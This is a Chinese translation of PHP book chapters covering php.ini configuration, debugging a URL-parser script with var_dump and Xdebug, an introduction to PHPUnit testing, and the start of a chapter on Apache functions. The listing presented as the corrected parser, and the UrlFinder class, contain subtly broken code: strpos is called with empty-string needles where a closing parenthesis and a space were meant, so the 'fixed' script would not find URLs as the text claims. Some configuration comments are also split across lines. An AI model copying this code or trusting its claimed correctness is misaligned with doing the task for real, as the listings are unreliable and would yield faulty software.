- 在 Linux/Unix/macOS 中，php.ini 文件通常位于 /usr/local/lib（Red Hat 为 /etc/php.ini；Debian 为 /etc/php8/apache2；等等），除非您另有指定。通常建议使用 /usr/etc/ 文件夹。

> **注意**
> 在第 2 章中，您已经了解 PHP 提供哪些 php.ini 变体，以及需要在哪里调整这些文件才能让 PHP 运行。

将 php.ini 放在 PHP 目录中确实有其优势。假设您想在一台机器上在多个 PHP 版本之间切换。例如，您更喜欢使用 PHP 8.3 进行编程，但也希望不时使用 PHP 8.2 进行兼容性测试。以下 Windows 配置步骤将帮助您尽可能方便地实现这一点：



- 配置 Web 服务器，使其将 PHP 解释器识别为 C:\php\php.exe（FastCGI 模式）。
- 将 PHP 8.2 安装在 C:\php82，将 PHP 8.3 安装在 C:\php83。
- 在创建的两个文件夹中各放置一个自定义版本的 php.ini（例如，注意已移除的配置选项）。
- 将要使用的 PHP 版本文件夹重命名为 C:\php。在此期间，可能需要停止并重新启动 Web 服务器。

按照这些步骤，PHP 版本的“安装”（或切换）就简化为简单的文件夹重命名。在其他操作系统下，这完全以同样的方式工作。

> 注释
> 
> 虽然不为人知，但非常实用：你也可以将 php.ini 文件放在 Windows 下的任何目录中，然后将 PHPRC 环境变量设置为 php.ini 所在的文件夹。我们在第 2 章中描述了这种变体。
> 
> 你还可以为 CLI 变体创建单独的配置文件：php-cli.ini。如果你同时将 PHP 用作 CGI 模块，也可以在名为 php-cgi.ini 的文件中指定特定的配置设置。

如果你想同时使用 CLI 版本和 CGI 版本的 PHP，可以为每个版本使用单独的特定 INI 文件：

- php-cgi.ini 用于 CGI 变体
- php-cli.ini 用于 CLI 版本

### 34.1.2 其他配置文件

如前所述，php.ini 不是 PHP 配置的唯一位置。在与 Apache Web 服务器配合使用时（另请参见第 37 章），还有两个选项：

- 在 Web 服务器上的 .htaccess 文件中
- 在 Apache 配置文件 httpd.conf 中

还有一个与 Web 服务器无关的第三个选项：

- 在 PHP 脚本中

让我们详细了解一下这三个选项：

- 在 Apache Web 服务器的每个目录中，你可以使用 .htaccess（取决于 Apache 配置）来发布配置指令——例如，用于访问控制或授权（另请参见第 33 章）。如果 Apache 作为模块使用，还可以使用以下两个指令设置 PHP 配置：
  - php_value option value
  - php_flag option value

使用 php_value 为你在 *php.ini* 文件中才能找到的配置选项指定值。用空格分隔设置名称和值：

```
php_value session.save_path "/sessiondata"
```

php_flag 是等效标志——即，用于布尔值：

```
php_flag short_open_tag On
```

完整的 Apache 配置可以在 *httpd.conf* 文件中找到；在那里你可以设置，例如，哪些文件扩展名由哪些模块处理以及它们具有哪些 MIME 类型。也可以在那里设置某些 PHP 设置。从 *.htaccess* 已知的 `php_value` 和 `php_flag` 指令也可用，还有以下两个变体：

- php_admin_value option value
- php_admin_flag option value

这两个指令的优点是，它们不能被 *.htaccess* 覆盖。

最后，你还可以按脚本基础设置配置值。相关函数称为 ini_set()：

```
<?php
ini_set("include_path", ".:/my/pear/path");
?>
```

因此有很多可能性，但不幸的是，并非每种可能性始终都是可行的选项。这可以理解，因为例如，如果脚本可以通过 ini_set() 更改 auto_prepend_file 选项，那将是致命的，因为 auto_prepend_file 在 PHP 脚本执行之前就已生效。这就是为什么配置选项有四个类别，你可以在表 34.1 中找到它们。

| 类别（常量） | 数值 | 可更改的选项 |
|---|---|---|
| PHP_INI_USER | 1 | ini_set() |
| PHP_INI_PERDIR | 2 | .htaccess, httpd.conf, php.ini |
| PHP_INI_SYSTEM | 4 | httpd.conf, php.ini |
| PHP_INI_ALL | 7 | ini_set(), .htaccess, httpd.conf, php.ini |

表 34.1 四个配置类别

还有一些选项只能在 *php.ini* 中设置，例如 disable_classes 和 disable_functions。

你可以在两个地方找到主要配置选项类别的（大部分）最新概览：

- 在 PHP 在线手册中，配置选项所属的相应模块页面上
- 手册页面的相应部分中集中查看（http://s-prs.co/v602295；另请参见图 34.1）

| 名称 | 默认值 | 可更改 | 变更日志 |
|---|---|---|---|
| allow_url_fopen | "1" | INI_SYSTEM | |
| allow_url_include | "0" | INI_SYSTEM | 自 PHP 7.4.0 起已弃用。 |
| arg_separator.input | "&" | INI_PERDIR | |
| arg_separator.output | "&" | INI_ALL | |
| assert.active | "1" | INI_ALL | |
| assert.bail | "0" | INI_ALL | |
| assert.callback | null | INI_ALL | |
| assert.exception | "0" | INI_ALL | |

图 34.1 配置选项概览，按字母顺序排列

## 34.2 配置什么？

本节包含随 PHP 提供的实际 php.ini 文件的带注释摘录。当然，没有足够的空间详细介绍每个选项，但最重要的部分仍应在此简要介绍。我们将重点介绍常规 PHP 选项；PHP 扩展的最重要配置开关列表可在各章的参考部分中找到。

> **注释**
> 
> 我们直接使用 PHP 版本管理系统中的 `php.ini-production` 文件，地址为 http://s-prs.co/v602252（截至 2024 年 12 月；另请参见图 34.2）。我们更改、修改或完全省略了一些设置。

![](img/ae7820c36e8f24c1623d26668b28e80e_919_0.png)

图 34.2 最新文件版本始终可在 GitHub 上获取

第一个主要部分称为“语言选项”，包含与 PHP 安装相关的常规设置——例如，Zend Engine 1 的兼容模式或短 PHP 标记（`<?`）的使用：

```
;;;;;;;;;;;;;;;;;;;;;
; Language Options ;
;;;;;;;;;;;;;;;;;;;;;
; Activate PHP for Apache
engine = On

; activate <?php
short_open_tag = Off

; Precision of decimal numbers (decimal places)
precision = 14
```

生成的 PHP 代码的输出既可以缓冲，也可以自动压缩：

```
; Enable buffer (buffer size in bytes)
output_buffering = 4096
; Pass total output to buffer function
;output_handler = 
; Compress output automatically via zlib
zlib.output_compression = Off
;zlib.output_compression_level = -1
; Special buffer function when using
;  zlib.output_compression ;
zlib.output_handler = 
; Empty the output buffer after each call to echo or print ;
(corresponds to a call to flush())
implicit_flush = Off
; Function to be called if an unknown class is found during
; deserialization
unserialize_callback_func=
; maximum nesting depth during deserialization
;unserialize_max_depth = 4096
; Precision in decimal places during serialization; -1 = best possible
serialize_precision = -1
```

尽管安全模式现已废弃（而且本来也从不充分），但 PHP 安装仍有一定的保护机制：

```
; Directory in which file operations are allowed (incl. subfolders)
;open_basedir = 
; List of disallowed functions (phpinfo, system ... makes sense)
disable_functions = 
; Classes that may not be used (separated by commas)
disable_classes = 
; Colors for .phps (syntax highlighting)
;highlight.string = #DD0000
;highlight.comment = #FF9900
;highlight.keyword = #007700
;highlight.default = #0000BB
;highlight.html = #000000
; Enable garbage collector
zend.enable_gc = On
; Maximum length for exceptions
zend.exception_string_param_max_len = 0
```

“资源限制”部分包含 PHP 允许使用的资源的一些限制，包括超时和内存限制：

```
;;;;;;;;;;;;;;;;;;;;;;;;
; Resource Limits ;
;;;;;;;;;;;;;;;;;;;;;;;;
max_execution_time = 30 ; Maximum script runtime
max_input_time = 60 ; Maximum time for parsing the input
max_input_nesting_level = 64 ; Maximum nesting depth
; in the input ;
max_input_vars = 1000 ; Maximum number of input variables
;max.multipart.body_parts = 1500 ; Maximum parts for multipart requests
memory_limit = 128M ; Maximum memory consumption
```

发生错误时，有几种反应方式。其中，PHP 提供错误日志记录（与 Apache 配合）以及不向 Web 浏览器发送错误消息的选项。后者在开发和测试期间不利，但在生产服务器上非常有用：

```
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Error handling and logging ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Levels for error_reporting:
; E_ALL - All errors and warnings
; E_ERROR - (Fatal) runtime errors
; E_RECOVERABLE_ERROR - Almost fatal runtime errors
; E_WARNING - Non-fatal runtime errors
; E_PARSE - Parser errors
; E_NOTICE - Run-time notices
; E_CORE_ERROR - errors when starting PHP;
; E_CORE_WARNING - warnings when starting PHP;
; E_COMPILE_ERROR - errors when compiling;
; E_COMPILE_WARNING - warnings when compiling
; E_USER_ERROR - user-specific error messages
; E_USER_WARNING - user-specific warnings
;
; E_USER_NOTICE - User-specific notices;
; E_DEPRECATED - Warnings for code that will no longer work in future PHP versions;
; E_USER_DEPRECATED - User-specific warnings for obsolete code
;
; Examples:
;
; - Everything except warnings and compatibility notes
;
; error_reporting = E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED
;
```



; - 除兼容性说明外的所有内容
;
error_reporting = E_ALL & ~E_DEPRECATED & ~E_STRICT
; 将错误发送到客户端（浏览器）
display_errors = Off
; PHP 启动时的错误
display_startup_errors = Off
; 将错误写入系统日志文件
log_errors = On
; 错误消息的最大长度（0 = 无限制）
log_errors_max_len = 1024
; 相同的错误位置仅保存一次
ignore_repeated_errors = Off
; 每个文件只有一个错误
ignore_repeated_source = Off
; 报告内存泄漏
report_memleaks = On
; 错误消息中启用 HTML（On = 可点击的错误消息）
;html_errors = On
; 本地 PHP 手册路径（用于 html_errors）
;docref_root = "/phpmanual/"
;docref_ext = .html
; 错误消息前的自动文本
;error_prepend_string = "<span style='color: #ff0000'>"
; 错误消息后的自动文本
;error_append_string = "</span>"
; 错误的专用日志文件
;error_log = php_errors.log
; 对错误使用 syslog（或 Windows 事件日志）
;error_log = syslog

PHP 最重要的任务之一是处理用户数据。在“数据处理”下有大量用于此目的的配置开关：

```
;;;;;;;;;;;;;;;;;;;
; Data Handling ;
;;;;;;;;;;;;;;;;;;;

;
; Separator for parameters in URLs generated by PHP
arg_separator.output = "&amp;"
; Parameter separator for PHP when parsing URLs
arg_separator.input = ";&"
; Order in which PHP environment, GET, POST, cookie,
; server and custom variables are registered
variables_order = "GPCS"
; Order in which PHP environment, GET, POST, cookie, server and custom
; variables are registered in $_REQUEST
request_order = "GP"
; Specifies whether GET variables should be saved in argv and argc (only
possible if auto_globals_jit is not activated)
register_argc_argv = Off
; Specifies whether environment, server and request variables should only be
created on first use
auto_globals_jit = On
; Maximum size of POST data (there is a separate setting for uploads!)
post_max_size = 8M
; Append/execute a file before/after each PHP script
auto_prepend_file =
auto_append_file =
; Value for the Content-Type HTTP header
default_mimetype = "text/html"
; Character set for the HTTP header
default_charset = "UTF-8"
```

PHP 不提供集成的项目管理，因此在模块化应用程序的意义上，大量工作是通过外部文件完成的。“路径和目录”部分包含指定这些文件位置等的设置：

```
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Paths and Directories ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Path in which included files are searched for via include/include_once/
require/require_once
; UNIX: "/path1:/path2"
;include_path = ".:/php/includes"
;
; Windows: "\path1;\path2"
;include_path = ".;c:\\php\\includes"
; Root directory for PHP scripts
doc_root =
; The directory under which PHP opens a script
user_dir =
; Directory in which the extension modules are located (everything except
Windows)
; extension_dir = "./"
; Directory in which the extension modules are located (Windows variant)
; extension_dir = "ext"
; Additional security for the CGI mode.
; Must be set to 0 for the IIS! ;
cgi.force_redirect = 1
; Specifies whether PHP should send the HTTP status code 200 with every request
;
cgi.nph = 1
; Environment variable that PHP looks for if
; cgi.force_redirect is activated ;
cgi.redirect_status_env = ;
; Adjust CGI path information according to specification
; cgi.fix_pathinfo = 1;
; CGI binary can be located outside the folder of the web application
; cgi.discard_path = 1;
; Enables impersonation under IIS
; fastcgi.impersonate = 1;
; Disables logging with FastCGI
; fastcgi.logging = 0;
; Type of HTTP headers sent by PHP.
; 0 = Apache-compatible (default),
; 1 = RFC2616-compatible
;cgi.rfc2616_headers = 0
```

关于文件上传，*php.ini* 中有一个单独的部分：

```
;;;;;;;;;;;;;;;;;
; File Uploads ;
;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;
; Activate file uploads
file_uploads = On
; Temporary directory
;upload_tmp_dir =
; Maximum size for file uploads
upload_max_filesize = 2M
; Maximum number of file uploads per request
max_file_uploads = 20
```

PHP 最实用的功能之一是文件操作也可以使用 HTTP 和 FTP URL。此行为可在“Fopen 包装器”下控制：

```
;;;;;;;;;;;;;;;;;
; Fopen wrappers ;
;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;
; Specifies whether URLs may be treated as files
allow_url_fopen = On
; Specifies whether external files may be executed via URL wrappers
; (deprecated since PHP 7.4.0, so there would be a warning when switching on)
allow_url_include = Off
; Password for anonymous FTP access
;from="john@doe.com"
; User agent when using file operations with URLs
;user_agent="PHP"
; Timeout for socket connections (in seconds)
default_socket_timeout = 60
; Automatically detect line endings (especially relevant for Mac)
;auto_detect_line_endings = Off
```

最后，让我们来看看可以加载 PHP 动态扩展模块（例如 PDF 库）的区域：

```
;;;;;;;;;;;;;;;;;;;;;;;
; Dynamic Extensions ;
;;;;;;;;;;;;;;;;;;;;;;;
;
;extension=bz2
;extension=ldap
;extension=curl
...
```

为此，只需删除 extension= 前面的分号，或自行添加相应行即可。如果要执行 PHP 的 CLI 版本，还需要正确设置 extension_dir，以便可以找到扩展。如果未注释掉 extension=bz 语句，则会相应加载 php_bz.dll 或 php_bz.so 扩展。某些扩展需要其他库，尤其是许多数据库扩展（有关说明，请参见第四部分的各个章节）。

php.ini 的其余设置是特定于模块的配置选项，有关这些选项，我们将您引向各自的章节。只有 [Date] 部分值得一提；在此处可以输入 PHP 将使用的默认时区：

```
;;;;;;;;;;;;;;;;;;;;;;;
; Module Settings ;
;;;;;;;;;;;;;;;;;;;;;;;
```

```
[Date]
; Default timezone
;date.timezone =
```

时区的一个可能值是 "Europe/Berlin"；完整列表可在 http://php.net/manual/timezones.php 中找到。

本章简要介绍了 php.ini 文件，并介绍了更改相关选项的各种方法。很容易在所有设置中迷失方向，但在实践中，始终只有少数设置需要修改（例如 extension_dir）。另一方面，您总会发现有用的或性能优化的选项，因此不妨时不时查看 php.ini。

# 第八部分

# 超越 PHP

## 第 35 章

### 使用 Xdebug 进行故障排除

*调试只针对犯错的人——不幸的是，这意味着我们所有人都需要调试。我们使用事实上的标准（以及其他技术）来查找 PHP 脚本中的错误。*

本书中的示例都有一个共同点：它们可以工作（至少在我们的测试中）。然而，代码并不总是天降神迹，有时是多次尝试和试验的结果。在实现过程中，我们反复遇到错误，然后不得不予以纠正。其中一些技术将在本章中简要描述。

在此点，我们不做的是检测解析器错误并修复它们。对于此类错误，源代码在语法上是不正确的；例如，可能缺少一个括号或引号。但是，PHP 总是会指示错误发生的行，这可能会很好地指示问题是什么或在哪里查找。如果您使用（好的）编辑器，它会在您输入时警告错误。

![](img/ae7820c36e8f24c1623d26668b28e80e_929_0.png)

**图 35.1** 解析器错误

> **提示**
> 还有一个提示：错误消息中的行号（参见图 35.1）有时会高出一行。原因：在 PHP 中，可以将语句拆分为多行；它们通常只以分号结束。如果 PHP 找不到分号，PHP 解释器只会在下一行才注意到这一点。

为了演示调试技术，¹ 我们需要一个（略有错误的）示例脚本。它是由未阅读过正则表达式章节的人编写的。

1 调试意味着 *消除错误*；在过去，大型主机中的昆虫经常是导致莫名错误的原因。





(第 10 章). 这个脚本用于从文本文件中筛选出所有 URL。方法如下：

- 逐行读取文件。
- 检查每一行是否包含字符串 `http://`。
- 如果包含，系统会查找 URL 的结尾（在空格或右括号之后）。²
- 显示找到的所有 URL。

2 这是一个非常糟糕的算法。例如，右括号在 URL 中也是被允许的。尽管如此，这个测试证明相对有效。换句话说：这不是代码中的主要缺陷。

下面的代码清单展示了完整示例。

```php
<?php
$url = [];
$file = fopen("text.txt", "r");
while (!feof($file)) {
    $line = fgets($file, 1024);
    if ($start = strpos($line, "http://")) {
        $end1 = strpos($line, ")", $start+1);
        $end2 = strpos($line, " ", $start+1);
        if ($end1 == -1 && $end2 == -1) {
            $end = strlen($line);
        } elseif ($end1 == -1) {
            $end = $end2;
        } elseif ($end2 == -1) {
            $end = $end1;
        } else {
            $end = min($end1, $end2);
        }
        $url[] = substr($line, $start, $end - $start);
    }
}
fclose($file);
echo implode("<br />", $url);
?>
```

### 代码清单 35.1 有缺陷的 URL 解析器（"debugger.php"）

当然，你还需要 `text.txt` 输入文件，如下一条代码清单所示。

经过几乎无尽的等待，PHP 项目（http://php.net/）今天发布了备受期待的新版本 8.3.0。源代码以及面向 Windows 用户的二进制文件链接（例如）可在 http://www.php.net/downloads.php 获得。
Mac 用户可以在 http://formulae.brew.sh/formula/php 中找到作为 homebrew 的二进制分发版。

### 代码清单 35.2 输入数据（"text.txt"）

执行该代码清单时，会确定 URL——但不是全部 URL（见图 35.2）。查看源代码也会发现，在 http:// php.net 后面插入了一个换行符，因此有一个第二个空 URL。因此至少有一个错误需要找到。

![](img/ae7820c36e8f24c1623d26668b28e80e_931_0.png)

### 图 35.2 找到了所有 URL——但是不是缺少了什么？

## 35.1 手动调试

最明显的调试方法很简单：只需在关键函数调用之前或之后输入 echo、print、print_r() 或 var_dump()。这样可以缩小问题原因范围。在代码清单 35.3 中，你可以看到第一种方法：输出所有包含内容的行号。

```php
<?php
$url = array();
$file = fopen("text.txt", "r");
$line_no = 0;
while (!feof($file)) {
    $line_no++;
    $line = fgets($file, 1024);
    if ($start = strpos($line, "http://")) {
        echo "Found what you were looking for in line $line_no.<br />";
        $end1 = strpos($line, ")", $start+1);
        $end2 = strpos($line, " ", $start+1);
        if ($end1 == -1 && $end2 == -1) {
            $end = strlen($line);
        } elseif ($end1 == -1) {
            $end = $end2;
        } elseif ($end2 == -1) {
            $end = $end1;
        } else {
            $end = min($end1, $end2);
        }
        $url[] = substr($line, $start, $end - $start);
    } else {
        echo "Did not find what you were looking for in line $line_no.<br />";
    }
}
fclose($file);
echo implode("<br />", $url);

?>
```

### 代码清单 35.3 第一种方法（"debugger-manual.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_932_0.png)

### 图 35.3 PHP 仅在两行中找到了它要找的内容

图 35.3 显示了结果：PHP 仅在第 1 行和第 5 行中找到了 URL，但在第 3 行中没有找到。不知何故，这一行似乎存在问题。一种方法是也在 else 分支中输出 $start 变量的值——但这次使用 var_dump() 而不是 echo！

```php
echo "Did not find what you were looking for in line $line_no: ";
var_dump($start);
echo "<br />";
```

var_dump() 与常规文本输出函数的区别在于，var_dump() 还会输出数据类型。图 35.4 显示了结果。你可以在第 3 行中看到一个特殊特征，并且可能也能猜出原因。

![](img/ae7820c36e8f24c1623d26668b28e80e_933_0.png)

### 图 35.4 使用 "var_dump()" 追踪错误

不过从长远来看，这样的查找非常繁琐——而且如果你在将网站上线前忘记删除调试代码，那就很尴尬了。因此，你应该寻找替代方案。

## 35.2 使用 Xdebug 调试

也许最著名的调试器来自 Derick Rethans，名为 Xdebug；项目主页是 www.xdebug.org。PHP 8 有了一个新的主版本，即 Xdebug 3，而 Xdebug 3.3.x 是为 PHP 8.3 发布的。Xdebug 3.4.0 增加了对 PHP 8.4 的支持。一如既往，完整源代码或面向 Windows 的二进制分发版均可供下载。后者适用于所有当前 PHP 版本。

在 Windows 上，安装扩展的方式与其他 PHP 扩展略有不同。由于 Xdebug 直接基于 PHP 的核心——Zend 引擎，你无法使用 `extension` 加载它，而需要特殊指令：`zend_extension`。如果需要，调整文件名并选择与你的 PHP 版本匹配的版本。一如既往，`nts` 代表 _非线程安全_（即特别适合在 IIS 中使用），`ts` 代表 _线程安全_：

```
zend_extension=C:/path/to/php_xdebug-3.4.0-8.3-vs16-nts-x86_64.dll
```

> **注意**
> 
> 如所示，你可能需要输入扩展模块的完整绝对路径，因为某些 PHP 版本中 `zend_extension` 不使用 `extension_dir` 的值。

如果你想（或不得不）手动编译源代码，请从 Xdebug 主页解压源代码存档并按照常规步骤操作：

```
phpize
./configure --enable-xdebug
make
```

你将得到一个名为 *xdebug.so* 的库文件，将其复制到 PHP 扩展目录中。然后编辑 *php.ini*。下一部分取决于你使用的 Web 服务器：

- 如果你将 Apache 2 和 PHP 作为模块使用，则必须使用线程安全扩展：
- `zend_extension_ts=/path/to/xdebug-3.4.0-8.3.so`
- 但是，如果你仍然使用 Apache 1 或将 PHP 作为 CGI 模块使用，则不需要线程安全：
- `zend_extension=/path/to/xdebug-3.4.0-8.3.so`

> **提示**
> 由于 Xdebug 现已进入 PECL，以下方法也有效（在正确配置的系统上）：
> `pecl install xdebug`
> 不过，你仍然需要查看 *php.ini*。
> 或者，你可以在 *https://xdebug.org/wizard.php* 上输入系统中 *phpinfo()* 调用的输出。然后你将收到特定于系统的安装说明。

安装后，紧接着是使用 *phpinfo()* 进行必要的检查：Xdebug 在 PHP 的信息输出中注册自身。除图 35.5 显示的输出外，你还会在标记为 **此程序使用 Zend 脚本语言引擎。** 的信息框中找到该工具。

现在 *php.ini* 中仅缺少以下其他设置（端口号通常也是 9000；查看监听器监听的端口 [参见图 35.7]）：

```
xdebug.mode = debug
xdebug.client_port = 9003
```

你也可以在 Xdebug 主页上找到一个客户端程序，用于建立与 Web 服务器上调试器的连接。Linux、macOS 和 Windows 的下载地址是 *https://xdebug.org/download#dbqpClient*。启动应用程序时，会激活一个监听器，用于等待来自调试器的传入连接。你只需调用一个 PHP 脚本，并在 URL 中附加 `?XDEBUG_SESSION_START=<name>` 即可。PHP 现在会发送一个带有指定名称作为值的 cookie（见图 35.6）。这是监听器变为活动状态的信号（见图 35.7）。例如，*run* 命令将简单地执行脚本；有关可用命令的更多信息可在 *https://xdebug.org/docs/dbqpClient* 找到。

![](img/ae7820c36e8f24c1623d26668b28e80e_935_0.png)

### 图 35.5 “phpinfo()” 输出中的“xdebug”条目

![](img/ae7820c36e8f24c1623d26668b28e80e_935_1.png)

### 图 35.6 Xdebug 发送了一个 Cookie ...



![](img/ae7820c36e8f24c1623d26668b28e80e_936_0.png)

图 35.7 ... 侦听器检测到传入连接

调试器也集成到某些编辑器中。如果在选项中激活调试（参见图 35.8）并按照所示在 Web 浏览器中打开一个页面，系统会自动跳转到编辑器，在那里可以使用通常的调试选项。

![](img/ae7820c36e8f24c1623d26668b28e80e_936_1.png)

图 35.8 Xdebug 集成到 PHPStorm 等多种工具中

另一个有用的选项是集成的性能分析。这需要两个额外的 php.ini 配置设置：

```
xdebug.mode = profile
xdebug.output_dir = /tmp
```

Xdebug 现在将性能分析数据存储在指定目录中。但是，这些数据无法直接解密。为此，你需要特殊软件，例如 KCachegrind 或 QCachegrind（参见图 35.9）。这样你就可以可视化性能分析数据了。

![](img/ae7820c36e8f24c1623d26668b28e80e_937_0.png)

图 35.9 QCachegrind 中的性能分析数据

Xdebug 正在不断开发；该软件的作者也定期就此主题进行演示，可在 http://s-prs.co/v602254 上找到。

> 提示
> KCachegrind 包中还包含一个 Perl 脚本，可以将数据转换为 ASCII 格式。然后你还可以使用其他软件进行进一步处理。

## 35.3 解决

调试器.php 文件中的错误在哪里？图 35.4 已经显示了一个很好的提示：在第三行中，$start 变量的值不是布尔值 false（如第 2、4 和 6 行所示），而是整数值 0。这就解开了谜题：strpos() 中的字符计数从 0 开始。因此，如果某行以 http:// 开头，则 strpos($line, "http://") 的返回值为 0。然而，作为布尔值，0 对应 false。因此 if (0) 等同于 if (false)，所以 if 分支不会被执行。但是，如果你使用 === 或 !== 运算符，就能达到预期目标，因为这会考虑数据类型，从而区分布尔值 false 和整数零。

为了使这一点不那么明显，我们在 if 查询中假装如果不存在子字符串，strpos() 就会返回 -1，但事实并非如此。因此，所有 ($variable == -1) 类型的查询也必须替换为 ($variable === false)。

列表 35.4 显示了调试器脚本的修正版本，图 35.10 显示了输出。

```php
<?php
$url = [];
$file = fopen("text.txt", "r");
while (!feof($file)) {
    $line = fgets($file, 1024);
    if (($start = strpos($line, "http://")) !== false) {
        $end1 = strpos($line, "", $start+1);
        $end2 = strpos($line, "", $start+1);
        if ($end1 === false && $end2 === false) {
            $end = strlen($line);
        } elseif ($end1 === false) {
            $end = $end2;
        } elseif ($end2 === false) {
            $end = $end1;
        } else {
            $end = min($end1, $end2);
        }
        $url[] = substr($line, $start, $end - $start);
    }
}
fclose($file);
echo implode("<br />", $url);
?>
```

列表 35.4 修正后的 URL 解析器（“debugger-fixed.php”)

![](img/ae7820c36e8f24c1623d26668b28e80e_938_0.png)

图 35.10 现在结果正确了

# 第 36 章

## 使用 PHPUnit 进行单元测试

无法避免错误。但是，如果能以某种方式自动检测错误（无论是从项目一开始，还是在项目生命周期中），那将很好。自动化测试是更快速（且持久）地检测错误的一种可能方法。

在软件开发过程中，这方面有很多方法。由于本书主要讲述 PHP 本身，而且我们对外部框架相对谨慎（因为向后兼容性、开发中的个人偏好，以及它们相对于 PHP 项目有时更快的量子飞跃），因此我们不参与这场讨论。

不过，我们想简要介绍一个已成为 PHP 事实标准的项目：由 Sebastian Bergmann 开发的 PHPUnit。该框架自 2004 年以来一直存在。它最初是作为 Java 框架 JUnit 的移植版本创建的，但早已独立。该项目的主页是 https://phpunit.de，源代码可在 GitHub 上的 http://s-prs.co/v602255 获取。

## 36.1 单元测试

单元测试旨在测试软件的功能单元。假设一个简单的情况。我们编写一个 PHP 函数，然后思考测试用例：哪些参数值应返回哪些结果？由此，我们创建一个映射：输入值 A 返回结果 X；输入值 B 返回结果 Y。然后可以使用合适的单元测试框架自动且定期地检查：结果是否正确？

俗话说：“只有在理论中，实践才像理论那样奏效。”单元测试也是如此：单纯在功能层面进行测试通常是不够的。复杂功能通常需要调用众多函数，必要时应分别对这些函数进行测试。某些功能需要用户输入、数据库后端或 HTTP 请求中的数据。这些必须要么提供，要么作为一种模拟对象（也称为 mock）来使用。

## 36.2 安装 PHPUnit

PHPUnit 为上述所有内容提供了众多可能性和功能。我们想用一个简单的例子来向你展示如何开始使用 PHPUnit。

安装 PHPUnit 有两种方法。一方面，你可以使用 Composer 包管理器（我们将在第 38 章中详细讨论）。一旦系统上设置了 Composer，它就会安装以下指令（参见图 36.1）：

```
composer require --dev phpunit/phpunit
```

图 36.1 通过 Composer 安装 PHPUnit

> **注意**
> 
> 对于最新的 PHPUnit 版本，你需要 mbstring PHP 扩展，通常通过 `php.ini` 文件进行安装。

或者，你也可以从 PHPUnit 下载 PHAR 包。主版本号的最新次要版本的 URL 为 https://phar.phpunit.de/phpunit-X.phar，例如 X 的值为 10。在此，我们假设你将此存档保存为 phpunit.phar。所有版本均可在 https://phar.phpunit.de 上找到。使 PHAR 文件可执行，然后按图 36.2 所示调用它。

图 36.2 执行 PHPUnit 的 PHAR 包

## 36.3 使用 PHPUnit 进行测试

安装框架后，就可以实现了。在测试代码之前，我们首先需要编写代码。1 在字符串中查找 URL 的功能在列表 36.1 中有所描述，并已转换为一个类（这样调用会更简单一些）。如果找到 URL，静态 UrlFinder::find() 方法会返回它；否则，会抛出 InvalidArgumentException 类型的异常。

1 不过，在测试驱动开发（TDD）中，实际上是先编写测试，再编写代码。

```php
<?php
class UrlFinder {
    public static function find($line) {
        if (($start = strpos($line, "http://")) != false) {
            $end1 = strpos($line, "", $start+1);
            $end2 = strpos($line, " ", $start+1);
            if ($end1 == false && $end2 == false) {
                $end = strlen($line);
            } elseif ($end1 == false) {
                $end = $end2;
            } elseif ($end2 === false) {
                $end = $end1;
            } else {
                $end = min($end1, $end2);
            }
            return substr($line, $start, $end - $start);
        } else {
            throw new InvalidArgumentException("No URL found");
        }
    }
}
?>
```

列表 36.1 带有 URL 解析器的类（“UrlFinder.php”)

要为该功能编写测试，我们需要创建一个带有测试用例的特殊测试类。在这个类中——它派生自 PHPUnit 的 TestCase 类——特定方法用于执行测试。每个测试方法都以 test 开头（这是 PHPUnit 自动识别它们的方式）。

在这些方法中，应用了所谓的 Arrange-Act-Assert（AAA）模式——即本质上：

- 1. 测试准备
- 2. 执行要测试的功能
- 3. 确认正确的结果

第三点，确认，通常称为断言。测试检查返回值是否为预期值。PHPUnit 的相应辅助方法也以 assert 开头。

以下是一个测试方法示例，用于检查是否为输入字符串正确确定了 URL：

```php
public function testFindInbetween()
{
    $this->assertEquals(
        'http://php.net/',
        UrlFinder::find('http://php.net/ is the homepage of the PHP project')
    );
}

```

如果抛出异常，当然无法使用 assertEquals() 进行比较，因为异常在实际意义上不是返回值。相反，我们需要确定是否抛出了特定类型的异常。这并非问题，因为 PHPUnit


提供了另一个用于此目的的辅助方法：expectException()。这可以如下所示：

```
$this->expectException(InvalidArgumentException::class);
UrlFinder::find('no URL');
```

清单 36.2 展示了完整测试类的概览。

```
<?php
use PHPUnit\Framework\TestCase;
require "UrlFinder.php";

class UrlFinderTest extends TestCase
{
    public function testNoUrl()
    {
        $this->expectException(InvalidArgumentException::class);
        UrlFinder::find('no URL');
    }

    public function testFindInbetween()
    {
        $this->assertEquals(
            'http://php.net/',
            UrlFinder::find('http://php.net/ is the homepage of the PHP project'));
    }
}
```

## 清单 36.2 PHPUnit 测试 ("UrlParserTest.php")

待测试的代码已经准备就绪，测试也是如此。只缺一样东西：执行测试的那片软件。顺便说一句，这恰恰就是需要自动化的地方！

如果以 PHAR 归档形式使用 PHPUnit，则所需的调用如下：

```
php phpunit.phar UrlFinderTest.php
```

使用 Composer 时，情况类似。PHPUnit 自动安装在 vendor/bin 中，可以直接调用（Windows 用户只需将斜杠替换为反斜杠）：

```
vendor/bin/phpunit UrlFinderTest.php
```

图 36.3 显示了结果：两个测试（含两个断言）均已执行，并且都通过了！

![](img/ae7820c36e8f24c1623d26668b28e80e_944_0.png)

图 36.3 测试通过：PHPUnit 毫无怨言

> **注意**
>
> 我们可以说是“作弊”了，因为测试类与代码本身位于同一目录（这不寻常），并且还通过 require 直接加载了待测试的类（这是不必要的）。在大多数情况下，会使用自动加载方式，可以是通过 Composer 自动生成的自动加载文件，也可以是手动生成的文件。调用 PHPUnit 时，可以使用 --bootstrap autoload.php 参数在执行测试前运行此文件。

关于 PHPUnit 的初步简要介绍就到此为止。更多信息可在项目网站上找到，即所有 PHPUnit 版本的详细文档（https://phpunit.de/documentation.html）。

## 第 37 章

# Apache 函数

*如果将 PHP 与 Apache Web 服务器一起使用，则会有一些内置的附加函数，具体取决于所选的安装方法。*

Apache 目前仍是使用最广泛的 Web 服务器之一。根据 W3Techs 的数据，它如今已失去头把交椅，被 Nginx 超越（<https://w3techs.com/technologies/overview/web_server>），但例如仍远远领先于 IIS。

